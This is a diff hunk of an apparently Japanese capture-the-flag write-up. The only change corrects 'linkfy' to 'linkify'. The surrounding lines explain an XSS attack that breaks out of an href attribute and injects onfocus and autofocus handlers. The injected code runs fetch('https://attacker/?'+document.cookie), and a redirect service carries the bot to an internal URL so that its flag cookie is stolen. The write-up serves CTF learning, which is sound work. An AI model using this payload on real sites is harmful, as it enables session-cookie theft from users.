@@ -48,7 +48,7 @@ def read_story(story_id: int):
 `"onfocus=fetch('https://attacker/?'+document.cookie) autofocus=`
 のような文字列を入れておくと、`href` から抜けて `onfocus` と `autofocus` が注入され、ページ読み込み時に自動で `fetch` が実行されます。
 
-`/read`にアクセスさせるためには`http://dream-of-you:5000`をURLとして指定する必要がありますが、これはlinkfyにはURLとして認識されないため、`https://redirectmeto.com/http://dream-of-you:5000`のようにしてリダイレクトを噛ませる必要があります。
+`/read`にアクセスさせるためには`http://dream-of-you:5000`をURLとして指定する必要がありますが、これはlinkifyにはURLとして認識されないため、`https://redirectmeto.com/http://dream-of-you:5000`のようにしてリダイレクトを噛ませる必要があります。
 
 これで Reader Bot の `flag` クッキーが取得できます。
 
